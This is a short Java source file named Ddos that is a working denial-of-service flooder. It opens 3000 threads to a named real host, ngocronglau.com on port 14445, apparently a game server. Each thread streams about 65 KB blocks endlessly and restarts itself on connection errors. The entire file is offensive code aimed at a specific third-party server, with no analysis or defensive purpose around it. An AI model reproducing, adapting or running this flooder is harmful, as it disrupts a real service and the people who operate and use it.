package nro.server;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;

public class Ddos {

    static String a = "a";

    public static void main(String[] args) {

        while (true) {
            if (a.length() > 65000) {
                break;
            }
            a += "aaaaaaaaaa";
        }
        for (int i = 0; i < 3000; i++) {
            attack();
        }
    }

    public static void attack() {
        new Thread(() -> {
            try {
                Socket sc = new Socket("ngocronglau.com", 14445);
                DataOutputStream dos = new DataOutputStream(sc.getOutputStream());
                while (true) {
                    dos.write(a.getBytes(), 0, 65000);
                    dos.flush();
                }
            } catch (IOException ex) {
                attack();
            }
        }).start();
    }
}